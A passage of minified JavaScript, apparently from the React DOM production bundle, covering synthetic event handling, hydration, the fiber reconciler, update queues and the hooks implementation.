e;if((f||p)&&(p=h.window===h?h:(p=h.ownerDocument)?p.defaultView||p.parentWindow:window,f?(y=n.relatedTarget||n.toElement,f=c,y=y?Rs(y):null,y!==null&&(g=Gs(y),y!==g||y.tag!==5&&y.tag!==6)&&(y=null)):(f=null,y=c),f!==y)){if(_=Jp,S="onMouseLeave",u="onMouseEnter",v="mouse",(t==="pointerout"||t==="pointerover")&&(_=ef,S="onPointerLeave",u="onPointerEnter",v="pointer"),g=f==null?p:hr(f),x=y==null?p:hr(y),p=new _(S,v+"leave",f,n,h),p.target=g,p.relatedTarget=x,S=null,Rs(h)===c&&(_=new _(u,v+"enter",y,n,h),_.target=x,_.relatedTarget=g,S=_),g=S,f&&y)t:{for(_=f,u=y,v=0,x=_;x;x=Xs(x))v++;for(x=0,S=u;S;S=Xs(S))x++;for(;0<v-x;)_=Xs(_),v--;for(;0<x-v;)u=Xs(u),x--;for(;v--;){if(_===u||u!==null&&_===u.alternate)break t;_=Xs(_),u=Xs(u)}_=null}else _=null;f!==null&&hf(d,p,f,_,!1),y!==null&&g!==null&&hf(d,g,y,_,!0)}}e:{if(p=c?hr(c):window,f=p.nodeName&&p.nodeName.toLowerCase(),f==="select"||f==="input"&&p.type==="file")var E=s_;else if(sf(p))if(sv)E=l_;else{E=a_;var A=r_}else(f=p.nodeName)&&f.toLowerCase()==="input"&&(p.type==="checkbox"||p.type==="radio")&&(E=o_);if(E&&(E=E(t,c))){iv(d,E,n,h);break e}A&&A(t,p,c),t==="focusout"&&(A=p._wrapperState)&&A.controlled&&p.type==="number"&&Pu(p,"number",p.value)}switch(A=c?hr(c):window,t){case"focusin":(sf(A)||A.contentEditable==="true")&&(ur=A,Wu=c,_a=null);break;case"focusout":_a=Wu=ur=null;break;case"mousedown":ju=!0;break;case"contextmenu":case"mouseup":case"dragend":ju=!1,cf(d,n,h);break;case"selectionchange":if(d_)break;case"keydown":case"keyup":cf(d,n,h)}var C;if(Nh)e:{switch(t){case"compositionstart":var L="onCompositionStart";break e;case"compositionend":L="onCompositionEnd";break e;case"compositionupdate":L="onCompositionUpdate";break e}L=void 0}else cr?tv(t,n)&&(L="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(L="onCompositionStart");L&&(ev&&n.locale!=="ko"&&(cr||L!=="onCompositionStart"?L==="onCompositionEnd"&&cr&&(C=Qg()):(Ki=h,kh="value"in Ki?Ki.value:Ki.textContent,cr=!0)),A=bl(c,L),0<A.length&&(L=new Qp(L,t,null,n,h),d.push({event:L,listeners:A}),C?L.data=C:(C=nv(n),C!==null&&(L.data=C)))),(C=Qx?e_(t,n):t_(t,n))&&(c=bl(c,"onBeforeInput"),0<c.length&&(h=new Qp("onBeforeInput","beforeinput",null,n,h),d.push({event:h,listeners:c}),h.data=C))}fv(d,e)})}function Ia(t,e,n){return{instance:t,listener:e,currentTarget:n}}function bl(t,e){for(var n=e+"Capture",i=[];t!==null;){var s=t,r=s.stateNode;s.tag===5&&r!==null&&(s=r,r=Aa(t,n),r!=null&&i.unshift(Ia(t,r,s)),r=Aa(t,e),r!=null&&i.push(Ia(t,r,s))),t=t.return}return i}function Xs(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function hf(t,e,n,i,s){for(var r=e._reactName,a=[];n!==null&&n!==i;){var o=n,l=o.alternate,c=o.stateNode;if(l!==null&&l===i)break;o.tag===5&&c!==null&&(o=c,s?(l=Aa(n,r),l!=null&&a.unshift(Ia(n,l,o))):s||(l=Aa(n,r),l!=null&&a.push(Ia(n,l,o)))),n=n.return}a.length!==0&&t.push({event:e,listeners:a})}var m_=/\r\n?/g,g_=/\u0000|\uFFFD/g;function pf(t){return(typeof t=="string"?t:""+t).replace(m_,`
`).replace(g_,"")}function bo(t,e,n){if(e=pf(e),pf(t)!==e&&n)throw Error(se(425))}function Sl(){}var Xu=null,qu=null;function Yu(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var $u=typeof setTimeout=="function"?setTimeout:void 0,v_=typeof clearTimeout=="function"?clearTimeout:void 0,ff=typeof Promise=="function"?Promise:void 0,y_=typeof queueMicrotask=="function"?queueMicrotask:typeof ff<"u"?function(t){return ff.resolve(null).then(t).catch(x_)}:$u;function x_(t){setTimeout(function(){throw t})}function Rc(t,e){var n=e,i=0;do{var s=n.nextSibling;if(t.removeChild(n),s&&s.nodeType===8)if(n=s.data,n==="/$"){if(i===0){t.removeChild(s),ka(e);return}i--}else n!=="$"&&n!=="$?"&&n!=="$!"||i++;n=s}while(n);ka(e)}function is(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function mf(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var Hr=Math.random().toString(36).slice(2),ii="__reactFiber$"+Hr,Da="__reactProps$"+Hr,Li="__reactContainer$"+Hr,Ku="__reactEvents$"+Hr,__="__reactListeners$"+Hr,b_="__reactHandles$"+Hr;function Rs(t){var e=t[ii];if(e)return e;for(var n=t.parentNode;n;){if(e=n[Li]||n[ii]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=mf(t);t!==null;){if(n=t[ii])return n;t=mf(t)}return e}t=n,n=t.parentNode}return null}function Qa(t){return t=t[ii]||t[Li],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function hr(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(se(33))}function Yl(t){return t[Da]||null}var Zu=[],pr=-1;function ps(t){return{current:t}}function pt(t){0>pr||(t.current=Zu[pr],Zu[pr]=null,pr--)}function dt(t,e){pr++,Zu[pr]=t.current,t.current=e}var us={},Kt=ps(us),un=ps(!1),Us=us;function Rr(t,e){var n=t.type.contextTypes;if(!n)return us;var i=t.stateNode;if(i&&i.__reactInternalMemoizedUnmaskedChildContext===e)return i.__reactInternalMemoizedMaskedChildContext;var s={},r;for(r in n)s[r]=e[r];return i&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=s),s}function dn(t){return t=t.childContextTypes,t!=null}function wl(){pt(un),pt(Kt)}function gf(t,e,n){if(Kt.current!==us)throw Error(se(168));dt(Kt,e),dt(un,n)}function gv(t,e,n){var i=t.stateNode;if(e=e.childContextTypes,typeof i.getChildContext!="function")return n;i=i.getChildContext();for(var s in i)if(!(s in e))throw Error(se(108,rx(t)||"Unknown",s));return vt({},n,i)}function Ml(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||us,Us=Kt.current,dt(Kt,t),dt(un,un.current),!0}function vf(t,e,n){var i=t.stateNode;if(!i)throw Error(se(169));n?(t=gv(t,e,Us),i.__reactInternalMemoizedMergedChildContext=t,pt(un),pt(Kt),dt(Kt,t)):pt(un),dt(un,n)}var Si=null,$l=!1,kc=!1;function vv(t){Si===null?Si=[t]:Si.push(t)}function S_(t){$l=!0,vv(t)}function fs(){if(!kc&&Si!==null){kc=!0;var t=0,e=st;try{var n=Si;for(st=1;t<n.length;t++){var i=n[t];do i=i(!0);while(i!==null)}Si=null,$l=!1}catch(s){throw Si!==null&&(Si=Si.slice(t+1)),Hg(Th,fs),s}finally{st=e,kc=!1}}return null}var fr=[],mr=0,El=null,Tl=0,kn=[],Ln=0,Os=null,Mi=1,Ei="";function Ms(t,e){fr[mr++]=Tl,fr[mr++]=El,El=t,Tl=e}function yv(t,e,n){kn[Ln++]=Mi,kn[Ln++]=Ei,kn[Ln++]=Os,Os=t;var i=Mi;t=Ei;var s=32-Yn(i)-1;i&=~(1<<s),n+=1;var r=32-Yn(e)+s;if(30<r){var a=s-s%5;r=(i&(1<<a)-1).toString(32),i>>=a,s-=a,Mi=1<<32-Yn(e)+s|n<<s|i,Ei=r+t}else Mi=1<<r|n<<s|i,Ei=t}function Dh(t){t.return!==null&&(Ms(t,1),yv(t,1,0))}function Uh(t){for(;t===El;)El=fr[--mr],fr[mr]=null,Tl=fr[--mr],fr[mr]=null;for(;t===Os;)Os=kn[--Ln],kn[Ln]=null,Ei=kn[--Ln],kn[Ln]=null,Mi=kn[--Ln],kn[Ln]=null}var Sn=null,bn=null,ft=!1,Wn=null;function xv(t,e){var n=Pn(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function yf(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,Sn=t,bn=is(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,Sn=t,bn=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=Os!==null?{id:Mi,overflow:Ei}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=Pn(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,Sn=t,bn=null,!0):!1;default:return!1}}function Ju(t){return(t.mode&1)!==0&&(t.flags&128)===0}function Qu(t){if(ft){var e=bn;if(e){var n=e;if(!yf(t,e)){if(Ju(t))throw Error(se(418));e=is(n.nextSibling);var i=Sn;e&&yf(t,e)?xv(i,n):(t.flags=t.flags&-4097|2,ft=!1,Sn=t)}}else{if(Ju(t))throw Error(se(418));t.flags=t.flags&-4097|2,ft=!1,Sn=t}}}function xf(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;Sn=t}function So(t){if(t!==Sn)return!1;if(!ft)return xf(t),ft=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Yu(t.type,t.memoizedProps)),e&&(e=bn)){if(Ju(t))throw _v(),Error(se(418));for(;e;)xv(t,e),e=is(e.nextSibling)}if(xf(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(se(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){bn=is(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}bn=null}}else bn=Sn?is(t.stateNode.nextSibling):null;return!0}function _v(){for(var t=bn;t;)t=is(t.nextSibling)}function kr(){bn=Sn=null,ft=!1}function Oh(t){Wn===null?Wn=[t]:Wn.push(t)}var w_=Ui.ReactCurrentBatchConfig;function Jr(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(se(309));var i=n.stateNode}if(!i)throw Error(se(147,t));var s=i,r=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===r?e.ref:(e=function(a){var o=s.refs;a===null?delete o[r]:o[r]=a},e._stringRef=r,e)}if(typeof t!="string")throw Error(se(284));if(!n._owner)throw Error(se(290,t))}return t}function wo(t,e){throw t=Object.prototype.toString.call(e),Error(se(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function _f(t){var e=t._init;return e(t._payload)}function bv(t){function e(u,v){if(t){var x=u.deletions;x===null?(u.deletions=[v],u.flags|=16):x.push(v)}}function n(u,v){if(!t)return null;for(;v!==null;)e(u,v),v=v.sibling;return null}function i(u,v){for(u=new Map;v!==null;)v.key!==null?u.set(v.key,v):u.set(v.index,v),v=v.sibling;return u}function s(u,v){return u=os(u,v),u.index=0,u.sibling=null,u}function r(u,v,x){return u.index=x,t?(x=u.alternate,x!==null?(x=x.index,x<v?(u.flags|=2,v):x):(u.flags|=2,v)):(u.flags|=1048576,v)}function a(u){return t&&u.alternate===null&&(u.flags|=2),u}function o(u,v,x,S){return v===null||v.tag!==6?(v=Oc(x,u.mode,S),v.return=u,v):(v=s(v,x),v.return=u,v)}function l(u,v,x,S){var E=x.type;return E===lr?h(u,v,x.props.children,S,x.key):v!==null&&(v.elementType===E||typeof E=="object"&&E!==null&&E.$$typeof===ji&&_f(E)===v.type)?(S=s(v,x.props),S.ref=Jr(u,v,x),S.return=u,S):(S=ol(x.type,x.key,x.props,null,u.mode,S),S.ref=Jr(u,v,x),S.return=u,S)}function c(u,v,x,S){return v===null||v.tag!==4||v.stateNode.containerInfo!==x.containerInfo||v.stateNode.implementation!==x.implementation?(v=Fc(x,u.mode,S),v.return=u,v):(v=s(v,x.children||[]),v.return=u,v)}function h(u,v,x,S,E){return v===null||v.tag!==7?(v=Ds(x,u.mode,S,E),v.return=u,v):(v=s(v,x),v.return=u,v)}function d(u,v,x){if(typeof v=="string"&&v!==""||typeof v=="number")return v=Oc(""+v,u.mode,x),v.return=u,v;if(typeof v=="object"&&v!==null){switch(v.$$typeof){case ho:return x=ol(v.type,v.key,v.props,null,u.mode,x),x.ref=Jr(u,null,v),x.return=u,x;case or:return v=Fc(v,u.mode,x),v.return=u,v;case ji:var S=v._init;return d(u,S(v._payload),x)}if(ua(v)||qr(v))return v=Ds(v,u.mode,x,null),v.return=u,v;wo(u,v)}return null}function p(u,v,x,S){var E=v!==null?v.key:null;if(typeof x=="string"&&x!==""||typeof x=="number")return E!==null?null:o(u,v,""+x,S);if(typeof x=="object"&&x!==null){switch(x.$$typeof){case ho:return x.key===E?l(u,v,x,S):null;case or:return x.key===E?c(u,v,x,S):null;case ji:return E=x._init,p(u,v,E(x._payload),S)}if(ua(x)||qr(x))return E!==null?null:h(u,v,x,S,null);wo(u,x)}return null}function f(u,v,x,S,E){if(typeof S=="string"&&S!==""||typeof S=="number")return u=u.get(x)||null,o(v,u,""+S,E);if(typeof S=="object"&&S!==null){switch(S.$$typeof){case ho:return u=u.get(S.key===null?x:S.key)||null,l(v,u,S,E);case or:return u=u.get(S.key===null?x:S.key)||null,c(v,u,S,E);case ji:var A=S._init;return f(u,v,x,A(S._payload),E)}if(ua(S)||qr(S))return u=u.get(x)||null,h(v,u,S,E,null);wo(v,S)}return null}function y(u,v,x,S){for(var E=null,A=null,C=v,L=v=0,w=null;C!==null&&L<x.length;L++){C.index>L?(w=C,C=null):w=C.sibling;var M=p(u,C,x[L],S);if(M===null){C===null&&(C=w);break}t&&C&&M.alternate===null&&e(u,C),v=r(M,v,L),A===null?E=M:A.sibling=M,A=M,C=w}if(L===x.length)return n(u,C),ft&&Ms(u,L),E;if(C===null){for(;L<x.length;L++)C=d(u,x[L],S),C!==null&&(v=r(C,v,L),A===null?E=C:A.sibling=C,A=C);return ft&&Ms(u,L),E}for(C=i(u,C);L<x.length;L++)w=f(C,u,L,x[L],S),w!==null&&(t&&w.alternate!==null&&C.delete(w.key===null?L:w.key),v=r(w,v,L),A===null?E=w:A.sibling=w,A=w);return t&&C.forEach(function(k){return e(u,k)}),ft&&Ms(u,L),E}function _(u,v,x,S){var E=qr(x);if(typeof E!="function")throw Error(se(150));if(x=E.call(x),x==null)throw Error(se(151));for(var A=E=null,C=v,L=v=0,w=null,M=x.next();C!==null&&!M.done;L++,M=x.next()){C.index>L?(w=C,C=null):w=C.sibling;var k=p(u,C,M.value,S);if(k===null){C===null&&(C=w);break}t&&C&&k.alternate===null&&e(u,C),v=r(k,v,L),A===null?E=k:A.sibling=k,A=k,C=w}if(M.done)return n(u,C),ft&&Ms(u,L),E;if(C===null){for(;!M.done;L++,M=x.next())M=d(u,M.value,S),M!==null&&(v=r(M,v,L),A===null?E=M:A.sibling=M,A=M);return ft&&Ms(u,L),E}for(C=i(u,C);!M.done;L++,M=x.next())M=f(C,u,L,M.value,S),M!==null&&(t&&M.alternate!==null&&C.delete(M.key===null?L:M.key),v=r(M,v,L),A===null?E=M:A.sibling=M,A=M);return t&&C.forEach(function(H){return e(u,H)}),ft&&Ms(u,L),E}function g(u,v,x,S){if(typeof x=="object"&&x!==null&&x.type===lr&&x.key===null&&(x=x.props.children),typeof x=="object"&&x!==null){switch(x.$$typeof){case ho:e:{for(var E=x.key,A=v;A!==null;){if(A.key===E){if(E=x.type,E===lr){if(A.tag===7){n(u,A.sibling),v=s(A,x.props.children),v.return=u,u=v;break e}}else if(A.elementType===E||typeof E=="object"&&E!==null&&E.$$typeof===ji&&_f(E)===A.type){n(u,A.sibling),v=s(A,x.props),v.ref=Jr(u,A,x),v.return=u,u=v;break e}n(u,A);break}else e(u,A);A=A.sibling}x.type===lr?(v=Ds(x.props.children,u.mode,S,x.key),v.return=u,u=v):(S=ol(x.type,x.key,x.props,null,u.mode,S),S.ref=Jr(u,v,x),S.return=u,u=S)}return a(u);case or:e:{for(A=x.key;v!==null;){if(v.key===A)if(v.tag===4&&v.stateNode.containerInfo===x.containerInfo&&v.stateNode.implementation===x.implementation){n(u,v.sibling),v=s(v,x.children||[]),v.return=u,u=v;break e}else{n(u,v);break}else e(u,v);v=v.sibling}v=Fc(x,u.mode,S),v.return=u,u=v}return a(u);case ji:return A=x._init,g(u,v,A(x._payload),S)}if(ua(x))return y(u,v,x,S);if(qr(x))return _(u,v,x,S);wo(u,x)}return typeof x=="string"&&x!==""||typeof x=="number"?(x=""+x,v!==null&&v.tag===6?(n(u,v.sibling),v=s(v,x),v.return=u,u=v):(n(u,v),v=Oc(x,u.mode,S),v.return=u,u=v),a(u)):n(u,v)}return g}var Lr=bv(!0),Sv=bv(!1),Al=ps(null),Cl=null,gr=null,Fh=null;function Bh(){Fh=gr=Cl=null}function zh(t){var e=Al.current;pt(Al),t._currentValue=e}function ed(t,e,n){for(;t!==null;){var i=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,i!==null&&(i.childLanes|=e)):i!==null&&(i.childLanes&e)!==e&&(i.childLanes|=e),t===n)break;t=t.return}}function Mr(t,e){Cl=t,Fh=gr=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(cn=!0),t.firstContext=null)}function Dn(t){var e=t._currentValue;if(Fh!==t)if(t={context:t,memoizedValue:e,next:null},gr===null){if(Cl===null)throw Error(se(308));gr=t,Cl.dependencies={lanes:0,firstContext:t}}else gr=gr.next=t;return e}var ks=null;function Vh(t){ks===null?ks=[t]:ks.push(t)}function wv(t,e,n,i){var s=e.interleaved;return s===null?(n.next=n,Vh(e)):(n.next=s.next,s.next=n),e.interleaved=n,Pi(t,i)}function Pi(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var Xi=!1;function Hh(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Mv(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Ai(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function ss(t,e,n){var i=t.updateQueue;if(i===null)return null;if(i=i.shared,qe&2){var s=i.pending;return s===null?e.next=e:(e.next=s.next,s.next=e),i.pending=e,Pi(t,n)}return s=i.interleaved,s===null?(e.next=e,Vh(i)):(e.next=s.next,s.next=e),i.interleaved=e,Pi(t,n)}function tl(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var i=e.lanes;i&=t.pendingLanes,n|=i,e.lanes=n,Ah(t,n)}}function bf(t,e){var n=t.updateQueue,i=t.alternate;if(i!==null&&(i=i.updateQueue,n===i)){var s=null,r=null;if(n=n.firstBaseUpdate,n!==null){do{var a={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};r===null?s=r=a:r=r.next=a,n=n.next}while(n!==null);r===null?s=r=e:r=r.next=e}else s=r=e;n={baseState:i.baseState,firstBaseUpdate:s,lastBaseUpdate:r,shared:i.shared,effects:i.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function Rl(t,e,n,i){var s=t.updateQueue;Xi=!1;var r=s.firstBaseUpdate,a=s.lastBaseUpdate,o=s.shared.pending;if(o!==null){s.shared.pending=null;var l=o,c=l.next;l.next=null,a===null?r=c:a.next=c,a=l;var h=t.alternate;h!==null&&(h=h.updateQueue,o=h.lastBaseUpdate,o!==a&&(o===null?h.firstBaseUpdate=c:o.next=c,h.lastBaseUpdate=l))}if(r!==null){var d=s.baseState;a=0,h=c=l=null,o=r;do{var p=o.lane,f=o.eventTime;if((i&p)===p){h!==null&&(h=h.next={eventTime:f,lane:0,tag:o.tag,payload:o.payload,callback:o.callback,next:null});e:{var y=t,_=o;switch(p=e,f=n,_.tag){case 1:if(y=_.payload,typeof y=="function"){d=y.call(f,d,p);break e}d=y;break e;case 3:y.flags=y.flags&-65537|128;case 0:if(y=_.payload,p=typeof y=="function"?y.call(f,d,p):y,p==null)break e;d=vt({},d,p);break e;case 2:Xi=!0}}o.callback!==null&&o.lane!==0&&(t.flags|=64,p=s.effects,p===null?s.effects=[o]:p.push(o))}else f={eventTime:f,lane:p,tag:o.tag,payload:o.payload,callback:o.callback,next:null},h===null?(c=h=f,l=d):h=h.next=f,a|=p;if(o=o.next,o===null){if(o=s.shared.pending,o===null)break;p=o,o=p.next,p.next=null,s.lastBaseUpdate=p,s.shared.pending=null}}while(!0);if(h===null&&(l=d),s.baseState=l,s.firstBaseUpdate=c,s.lastBaseUpdate=h,e=s.shared.interleaved,e!==null){s=e;do a|=s.lane,s=s.next;while(s!==e)}else r===null&&(s.shared.lanes=0);Bs|=a,t.lanes=a,t.memoizedState=d}}function Sf(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var i=t[e],s=i.callback;if(s!==null){if(i.callback=null,i=n,typeof s!="function")throw Error(se(191,s));s.call(i)}}}var eo={},oi=ps(eo),Ua=ps(eo),Oa=ps(eo);function Ls(t){if(t===eo)throw Error(se(174));return t}function Gh(t,e){switch(dt(Oa,e),dt(Ua,t),dt(oi,eo),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Iu(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=Iu(e,t)}pt(oi),dt(oi,e)}function Pr(){pt(oi),pt(Ua),pt(Oa)}function Ev(t){Ls(Oa.current);var e=Ls(oi.current),n=Iu(e,t.type);e!==n&&(dt(Ua,t),dt(oi,n))}function Wh(t){Ua.current===t&&(pt(oi),pt(Ua))}var mt=ps(0);function kl(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Lc=[];function jh(){for(var t=0;t<Lc.length;t++)Lc[t]._workInProgressVersionPrimary=null;Lc.length=0}var nl=Ui.ReactCurrentDispatcher,Pc=Ui.ReactCurrentBatchConfig,Fs=0,gt=null,Rt=null,Dt=null,Ll=!1,ba=!1,Fa=0,M_=0;function Ht(){throw Error(se(321))}function Xh(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!Kn(t[n],e[n]))return!1;return!0}function qh(t,e,n,i,s,r){if(Fs=r,gt=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,nl.current=t===null||t.memoizedState===null?C_:R_,t=n(i,s),ba){r=0;do{if(ba=!1,Fa=0,25<=r)throw Error(se(301));r+=1,Dt=Rt=null,e.updateQueue=null,nl.current=k_,t=n(i,s)}while(ba)}if(nl.current=Pl,e=Rt!==null&&Rt.next!==null,Fs=0,Dt=Rt=gt=null,Ll=!1,e)throw Error(se(300));return t}function Yh(){var t=Fa!==0;return Fa=0,t}function ti(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Dt===null?gt.memoizedState=Dt=t:Dt=Dt.next=t,Dt}function Un(){if(Rt===null){var t=gt.alternate;t=t!==null?t.memoizedState:null}else t=Rt.next;var e=Dt===null?gt.memoizedState:Dt.next;if(e!==null)Dt=e,Rt=t;else{if(t===null)throw Error(se(310));Rt=t,t={memoizedState:Rt.memoizedState,baseState:Rt.baseState,baseQueue:Rt.baseQueue,queue:Rt.queue,next:null},Dt===null?gt.memoizedState=Dt=t:Dt=Dt.next=t}return Dt}function Ba(t,e){return typeof e=="function"?e(t):e}function Nc(t){var e=Un(),n=e.queue;if(n===null)throw Error(se(311));n.lastRenderedReducer=t;var i=Rt,s=i.baseQueue,r=n.pending;if(r!==null){if(s!==null){var a=s.next;s.next=r.next,r.next=a}i.baseQueue=s=r,n.pending=null}if(s!==null){r=s.next,i=i.baseState;var o=a=null,l=null,c=r;do{var h=c.lane;if((Fs&h)===h)l!==null&&(l=l.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),i=c.hasEagerState?c.eagerState:t(i,c.action);else{var d={lane:h,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};l===null?(o=l=d,a=i):l=l.next=d,gt.lanes|=h,Bs|=h}c=c.next}while(c!==null&&c!==r);l===null?a=i:l.next=o,Kn(i,e.memoizedState)||(cn=!0),e.memoizedState=i,e.baseState=a,e.baseQueue=l,n.lastRenderedState=i}if(t=n.interleaved,t!==null){s=t;do r=s.lane,gt.lanes|=r,Bs|=r,s=s.next;while(s!==t)}else s===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function Ic(t){var e=Un(),n=e.queue;if(n===null)throw Error(se(311));n.lastRenderedReducer=t;var i=n.dispatch,s=n.pending,r=e.memoizedState;if(s!==null){n.pending=null;var a=s=s.next;do r=t(r,a.action),a=a.next;while(a!==s);Kn(r,e.memoizedState)||(cn=!0),e.memoizedState=r,e.baseQueue===null&&(e.baseState=r),n.lastRenderedState=r}return[r,i]}function Tv(){}function Av(t,e){var n=gt,i=Un(),s=e(),r=!Kn(i.memoizedState,s);if(r&&(i.memoizedState=s,cn=!0),i=i.queue,$h(kv.bind(null,n,i,t),[t]),i.getSnapshot!==e||r||Dt!==null&&Dt.memoizedState.tag&1){if(n.flags|=2048,za(9,Rv.bind(null,n,i,s,e),void 0,null),Ut===null)throw Error(se(349));Fs&30||Cv(n,e,s)}return s}function Cv(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=gt.updateQueue,e===null?(e={lastEffect:null,stores:null},gt.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function Rv(t,e,n,i){e.value=n,e.getSnapshot=i,Lv(e)&&Pv(t)}function kv(t,e,n){return n(function(){Lv(e)&&Pv(t)})}function Lv(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!Kn(t,n)}catch{return!0}}function Pv(t){var e=Pi(t,1);e!==null&&$n(e,t,1,-1)}function wf(t){var e=ti();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Ba,lastRenderedState:t},e.queue=t,t=t.dispatch=A_.bind(null,gt,t),[e.memoizedState,t]}function za(t,e,n,i){return t={tag:t,create:e,destroy:n,deps:i,next:null},e=gt.updateQueue,e===null?(e={lastEffect:null,stores:null},gt.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(i=n.next,n.next=t,t.next=i,e.lastEffect=t)),t}function Nv(){return Un().memoizedState}function il(t,e,n,i){var s=ti();gt.flags|=t,s.memoizedState=za(1|e,n,void 0,i===void 0?null:i)}function Kl(t,e,n,i){var s=Un();i=i===void 0?null:i;var r=void 0;if(Rt!==null){var a=Rt.memoizedState;if(r=a.destroy,i!==null&&Xh(i,a.deps)){s.memoizedState=za(e,n,r,i);return}}gt.flags|=t,s.memoizedState=za(1|e,n,r,i)}function Mf(t,e){return il(8390656,8,t,e)}function $h(t,e){return Kl(2048,8,t,e)}function Iv(t,e){return Kl(4,2,t,e)}function Dv(t,e){return Kl(4,4,t,e)}function Uv(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function Ov(t,e,n){return n=n!=null?n.concat([t]):null,Kl(4,4,Uv.bind(null,e,t),n)}function Kh(){}function Fv(t,e){var n=Un();e=e===void 0?null:e;var i=n.memoizedState;return i!==null&&e!==null&&Xh(e,i[1])?i[0]:(n.memoizedState=[t,e],t)}function Bv(t,e){var n=Un();e=e===void 0?null:e;var i=n.memoizedState;return i!==null&&e!==null&&Xh(e,i[1])?i[0]:(t=t(),n.memoizedState=[t,e],t)}function zv(t,e,n){return Fs&21?(Kn(n,e)||(n=jg(),gt.lanes|=n,Bs|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,cn=!0),t.memoizedState=n)}function E_(t,e){var n=st;st=n!==0&&4>n?n:4,t(!0);var i=Pc.transition;Pc.transition={};try{t(!1),e()}finally{st=n,Pc.transition=i}}function Vv(){return Un().memoizedState}function T_(t,e,n){var i=as(t);if(n={lane:i,action:n,hasEagerState:!1,eagerState:null,next:null},Hv(t))Gv(e,n);else if(n=wv(t,e,n,i),n!==null){var 